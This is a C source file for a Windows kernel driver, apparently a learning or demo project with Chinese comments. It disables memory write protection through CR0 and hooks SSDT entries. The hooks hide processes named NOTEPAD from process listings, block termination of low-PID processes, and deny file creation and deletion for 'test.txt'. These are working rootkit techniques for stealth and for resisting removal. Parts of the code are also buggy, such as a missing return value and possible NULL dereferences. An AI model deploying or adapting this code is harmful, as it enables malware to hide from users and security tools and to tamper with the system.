#include "ssdt.h"

ULONG g_uCr0;
ULONG g_Init = FALSE;

NTSTATUS Hook(ULONG OldService, ULONG NewService)
{
    if(!g_Init)
    {
        DbgPrint(("ServiceTalbe Not Init.\n"));
        return STATUS_UNSUCCESSFUL;
    }

    WPOFF();

    DbgPrint("NewService");
	//TRACE("New Service\n");
    *(PULONG)SERVICE_FUNCTION(OldService) = NewService;

    WPON();
    return STATUS_SUCCESS;
}

// 恢复HOOK
NTSTATUS UnHook(ULONG OldService)
{
    if(!g_Init)
    {
        return STATUS_UNSUCCESSFUL;
    }

    WPOFF();

    // 还原钩子函数
    *(PULONG)SERVICE_FUNCTION(OldService) = OldServiceAddressTable[SERVICE_ID(OldService)];

    WPON();

    return STATUS_SUCCESS;
}

VOID InitServicesTable()
{
    ULONG i;

    // 初始化时定义该标签
    g_Init = TRUE;
    DbgPrint("ssdt driver loaded");
    for(i = 0; i < KeServiceDescriptorTable.NumberOfService; i++)
    {
        OldServiceAddressTable[i] = *(PULONG)((ULONG)KeServiceDescriptorTable.ServiceTableBase + 4*i);
    }
}

// 去除内存写保护
VOID WPOFF()
{
    ULONG uAttr;
    _asm
    {
        push eax
        mov eax, cr0
        mov uAttr, eax
        and eax, 0FFFEFFFFh
        mov cr0, eax
        pop eax
        cli
    }
    g_uCr0 = uAttr;
}

// 恢复内存写保护
VOID WPON()
{
    _asm
    {
        sti
        push eax
        mov eax, g_uCr0
        mov cr0, eax
        pop eax
    }
}

/////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////
typedef struct _SYSTEM_PROCESSES { // Information Class 5
        ULONG NextEntryDelta;
        ULONG ThreadCount;
        ULONG Reserved1[6];
        LARGE_INTEGER CreateTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER KernelTime;
        UNICODE_STRING ProcessName;
        KPRIORITY BasePriority;
        ULONG ProcessId;
        ULONG InheritedFromProcessId;
        ULONG HandleCount;
        ULONG Reserved2[2];
        VM_COUNTERS VmCounters;
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;




// 定义HOOK的函数原型
typedef
NTSTATUS
(__stdcall *NTSETINFORMATIONFILE)(IN HANDLE FileHandle,
                                  OUT PIO_STATUS_BLOCK IoStatusBlock,
                                  IN PVOID FileInformation,
                                  IN ULONG Length,
                                  IN FILE_INFORMATION_CLASS FileInformationClass);
typedef
NTSTATUS
(__stdcall *NTOPENPROCESS)( OUT PHANDLE ProcessHandle,
                            IN ACCESS_MASK AccessMask,
                            IN POBJECT_ATTRIBUTES ObjectAttributes,
                            IN PCLIENT_ID ClientId);

typedef
NTSTATUS
(__stdcall *NTTERMINATEPROCESS)( IN HANDLE ProcessHandle OPTIONAL,
                                 IN NTSTATUS ExitStatus);

typedef
NTSTATUS
(__stdcall *NTCREATEFILE)(  OUT PHANDLE FileHandle,
                            IN ACCESS_MASK DesiredAccess,
                            IN POBJECT_ATTRIBUTES ObjectAttributes,
                            OUT PIO_STATUS_BLOCK IoStatusBlock,
                            IN PLARGE_INTEGER AllocationSize OPTIONAL,
                            IN ULONG FileAttributes,
                            IN ULONG ShareAccess,
                            IN ULONG CreateDisposition,
                            IN ULONG CreateOptions,
                            IN PVOID EaBuffer OPTIONAL,
                            IN ULONG EaLength);

typedef
NTSTATUS
(__stdcall *NTQUERYSYSTEMINFORMATION)(
    IN ULONG SystemInformationClass,
    IN PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength
    );

typedef
NTSTATUS
(__stdcall *NTCREATKEY)(
     OUT PHANDLE KeyHandle,
     IN ACCESS_MASK DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     IN ULONG TitleIndex,
     IN PUNICODE_STRING Class OPTIONAL,
     IN ULONG CreateOptions,
     OUT PULONG Disposition OPTIONAL
    );


// 对于ntddk.h中未定义的函数
// 需要自己定义
NTSYSAPI
NTSTATUS
NTAPI
ZwCreateFile(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
    IN ULONG SystemInformationClass,
    IN PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateKey(
     OUT PHANDLE KeyHandle,
     IN ACCESS_MASK DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     IN ULONG TitleIndex,
     IN PUNICODE_STRING Class OPTIONAL,
     IN ULONG CreateOptions,
     OUT PULONG Disposition OPTIONAL
 );
// ==============================================================


//////////////////////////////////////////////////////////////////////
NTSTATUS MyNtSetInformationFile(IN HANDLE FileHandle,
                                OUT PIO_STATUS_BLOCK IoStatusBlock,
                                IN PVOID FileInformation,
                                IN ULONG Length,
                                IN FILE_INFORMATION_CLASS FileInformationClass)
{
    PFILE_OBJECT pFileObject;

    // 在OldServiceAddressTable中取出原服务函数地址
    NTSETINFORMATIONFILE OldNtSetInformationFile =
        (NTSETINFORMATIONFILE)OldServiceAddressTable[SERVICE_ID(ZwSetInformationFile)];

    NTSTATUS ret = ObReferenceObjectByHandle(FileHandle,
                                             GENERIC_READ,
                                             *IoFileObjectType,
                                             KernelMode,
                                             (PVOID*)&pFileObject,
                                             0);
    if(NT_SUCCESS(ret))
    {
        DbgPrint("[NtSetInformationFile] %S opened.\n", pFileObject->FileName.Buffer);
        if (wcsstr(pFileObject->FileName.Buffer, L"test.txt"))
        {
            DbgPrint(("test.txt deleting. Denied.\n"));
            return STATUS_ACCESS_DENIED;
        }
    }

    return OldNtSetInformationFile( FileHandle, IoStatusBlock, FileInformation,
                                    Length, FileInformationClass);
}

//////////////////////////////////////////////////////////////////////
NTSTATUS MyNtOpenProcess(OUT PHANDLE ProcessHandle,
                         IN ACCESS_MASK DesiredAccess,
                         IN POBJECT_ATTRIBUTES ObjectAttributes,
                         IN PCLIENT_ID ClientId )
{
    NTSTATUS rc;
    ULONG PID;
    ULONG uPID;
    NTSTATUS rtStatus;
    PCHAR pStrProcName;
    PEPROCESS pEProcess;
    ANSI_STRING strProcName;
    NTOPENPROCESS OldNtOpenProcess =
        (NTOPENPROCESS)OldServiceAddressTable[SERVICE_ID(ZwOpenProcess)];

	/*rtStatus = ObReferenceObjectByHandle(ProcessHandle, FILE_READ_DATA, NULL, KernelMode, (PVOID*)&pEProcess, NULL);
    if (!NT_SUCCESS(rtStatus))
    {
        return rtStatus;
    }


    uPID = (ULONG)PsGetProcessId(pEProcess);
    pStrProcName = _strupr((TCHAR *)PsGetProcessImageFileName(pEProcess));
    RtlInitAnsiString(&strProcName, pStrProcName);

    DbgPrint(("PID:%u  [NTOpenPrcess]\n",uPID));
*/

    if(ClientId != NULL)
    {
        PID = (ULONG)ClientId->UniqueProcess;
        //if(PID > 1000)
        //{
            DbgPrint("[MyNtOpenProcess] PID:%u,opened\n",PID);
            //return STATUS_ACCESS_DENIED;
        //}
    }
    return OldNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

//////////////////////////////////////////////////////////////////////
NTSTATUS MyNtTerminateProcess(IN HANDLE ProcessHandle OPTIONAL,
                         IN NTSTATUS ExitStatus )
{
    ULONG uPID;
    NTSTATUS rtStatus;
    PCHAR pStrProcName;
    PEPROCESS pEProcess;
    ANSI_STRING strProcName;
    NTTERMINATEPROCESS OldNtTerminateProcess =
        (NTTERMINATEPROCESS)OldServiceAddressTable[SERVICE_ID(ZwTerminateProcess)];
    DbgPrint("[MyNtTerminateProcess] called");

    rtStatus = ObReferenceObjectByHandle(ProcessHandle, FILE_READ_DATA, NULL, KernelMode, (PVOID*)&pEProcess, NULL);
    if (!NT_SUCCESS(rtStatus))
    {
        return rtStatus;
    }

    uPID = (ULONG)PsGetProcessId(pEProcess);
    pStrProcName = _strupr((TCHAR *)PsGetProcessImageFileName(pEProcess));//使用微软未公开的PsGetProcessImageFileName函数获取进程名

    RtlInitAnsiString(&strProcName, pStrProcName);

    DbgPrint(("[MyNtTerminateProcess] %u\n",uPID));

    if (uPID<1000)
    {
        if (uPID != (ULONG)PsGetProcessId(PsGetCurrentProcess()))
        {
            return STATUS_ACCESS_DENIED;
        }
    }
    // 对于非保护的进程可以直接调用原来 SSDT 中的 NtTerminateProcess 来结束进程
    rtStatus = OldNtTerminateProcess(ProcessHandle, ExitStatus);
    return rtStatus;
}

///////////////////////////////////////////////////////////////////////
NTSTATUS MyNtCreateFile(    OUT PHANDLE FileHandle,
                            IN ACCESS_MASK DesiredAccess,
                            IN POBJECT_ATTRIBUTES ObjectAttributes,
                            OUT PIO_STATUS_BLOCK IoStatusBlock,
                            IN PLARGE_INTEGER AllocationSize OPTIONAL,
                            IN ULONG FileAttributes,
                            IN ULONG ShareAccess,
                            IN ULONG CreateDisposition,
                            IN ULONG CreateOptions,
                            IN PVOID EaBuffer OPTIONAL,
                            IN ULONG EaLength)
{

    NTCREATEFILE OldNtCreateFile =
        (NTCREATEFILE)OldServiceAddressTable[SERVICE_ID(ZwCreateFile)];
    PFILE_OBJECT pFileObject;

    NTSTATUS ret = ObReferenceObjectByHandle(FileHandle,
                                             GENERIC_READ,
                                             *IoFileObjectType,
                                             KernelMode,
                                             (PVOID*)&pFileObject,
                                             0);

    if(NT_SUCCESS(ret))
    {
        DbgPrint(("[MyNtCreateFile] %S created.\n", pFileObject->FileName.Buffer));
        if (wcsstr(pFileObject->FileName.Buffer, L"test.txt"))
        {
            DbgPrint(("[MyNtCreateFile]test.txt created. \n"));
            return STATUS_ACCESS_DENIED;
        }
    }

    //DbgPrint(("[MyNtCreateFile] called.\n"));

    return OldNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize,  \
     FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

/////////////////////////////////////////////////////////////////////////
// hide processes
 NTSTATUS MyNtQuerySystemInformation(
    IN ULONG SystemInformationClass,
    IN PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength)
 {
        NTSTATUS rtStatus;

        NTQUERYSYSTEMINFORMATION OldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)
            OldServiceAddressTable[SERVICE_ID(ZwQuerySystemInformation)];

        rtStatus = OldNtQuerySystemInformation(SystemInformationClass, SystemInformation,
            SystemInformationLength, ReturnLength);
        if(NT_SUCCESS(rtStatus))
        {
            if(5 == SystemInformationClass)
            {
                PSYSTEM_PROCESSES pPrevProcessInfo = NULL;
                PSYSTEM_PROCESSES pCurrProcessInfo =
                    (PSYSTEM_PROCESSES)SystemInformation;
                //DbgPrint("[MyNtQuerySystemInformation]:PID%u\n",  pCurrProcessInfo->ProcessId);
                while(pCurrProcessInfo != NULL)
                {

                    //获取当前遍历的 SYSTEM_PROCESSES 节点的进程名称和进程 ID
                    ULONG uPID = (ULONG)pCurrProcessInfo->ProcessId;
                    UNICODE_STRING name = pCurrProcessInfo->ProcessName;

					//DbgPrint("[MyNtQuerySystemInformation]:PID[%u]\n",  pCurrProcessInfo->ProcessId);

                    UNICODE_STRING UniProcessName,str;
                    RtlInitUnicodeString(&UniProcessName,name.Buffer);
                    RtlUpcaseUnicodeString(&str,&UniProcessName,TRUE);
                    //判断当前遍历的这个进程是否为需要隐藏的进程
                    DbgPrint("[MyNtQuerySystemInformation]:PID[%u]\n",  uPID);
                    DbgPrint("%S\n",  name.Buffer);
                    if(RtlCompareMemory(str.Buffer, L"NOTEPAD", 14) == 14)
                    //if(uPID > 1000)
                    {
                        //DbgPrint(("THIS IS THE PID.\n"));

                        if(pPrevProcessInfo)
                        {
                            if(pCurrProcessInfo->NextEntryDelta)
                            {
                                //更改链表指针
                                pPrevProcessInfo->NextEntryDelta += pCurrProcessInfo->NextEntryDelta;
                            }
                            else
                            {
                                //当前要隐藏的这个进程是进程链表中的最后一个
                                pPrevProcessInfo->NextEntryDelta = 0;
                            }
                        }
                        else
                        {
                            //第一个遍历到得进程就是需要隐藏的进程
                            if(pCurrProcessInfo->NextEntryDelta)
                            {
                        pCurrProcessInfo = (PSYSTEM_PROCESSES)
                            (((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryDelta);
                            }
                            else
                            {
                                pCurrProcessInfo = NULL;
                            }
                        }
                    }

                 pPrevProcessInfo = pCurrProcessInfo;

                    //end
                    if(pCurrProcessInfo->NextEntryDelta)
                    {
                        pCurrProcessInfo = (PSYSTEM_PROCESSES)
                            (((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryDelta);
                    }
                    else
                    {
                        pCurrProcessInfo = NULL;
                    }
                }
            }
        }
        return rtStatus;
    }


////////////////////////////////////////////////////////////////////////////////////
NTSTATUS MyNtCreateKey(  OUT PHANDLE KeyHandle,
                         IN ACCESS_MASK DesiredAccess,
                         IN POBJECT_ATTRIBUTES ObjectAttributes,
                         IN ULONG TitleIndex,
                         IN PUNICODE_STRING Class OPTIONAL,
                         IN ULONG CreateOptions,
                         OUT PULONG Disposition OPTIONAL
                         )
{

    NTSTATUS status;
    NTCREATKEY OldNtCreateKey =
        (NTCREATKEY)OldServiceAddressTable[SERVICE_ID(ZwCreateKey)];

    DbgPrint(("[MyNtCreateKey] called.\n"));

    status = OldNtCreateKey(KeyHandle, DesiredAccess, ObjectAttributes, TitleIndex, Class,  \
     CreateOptions, Disposition);
}
/////////////////////////////////////////////////////////////////////////////////

// Unload例程 卸载钩子
VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
    DbgPrint(("Unload ssdt driver.\n"));
    UnHook((ULONG)ZwSetInformationFile);
    UnHook((ULONG)ZwOpenProcess);
    UnHook((ULONG)ZwTerminateProcess);
    UnHook((ULONG)ZwCreateFile);
    UnHook((ULONG)ZwQuerySystemInformation);
    UnHook((ULONG)ZwCreateKey);


}

// DriverEntry例程 初始化并安装钩子
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,
                     IN PUNICODE_STRING RegistryPath)
{
    DriverObject->DriverUnload = Unload;
    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
    InitServicesTable();
    Hook((ULONG)ZwSetInformationFile, (ULONG)MyNtSetInformationFile);
    Hook((ULONG)ZwOpenProcess, (ULONG)MyNtOpenProcess);
    Hook((ULONG)ZwTerminateProcess, (ULONG)MyNtTerminateProcess);
    Hook((ULONG)ZwCreateFile, (ULONG)MyNtCreateFile);
    Hook((ULONG)ZwQuerySystemInformation, (ULONG)MyNtQuerySystemInformation);
    Hook((ULONG)ZwCreateKey, (ULONG)MyNtCreateKey);


    return STATUS_SUCCESS;
}
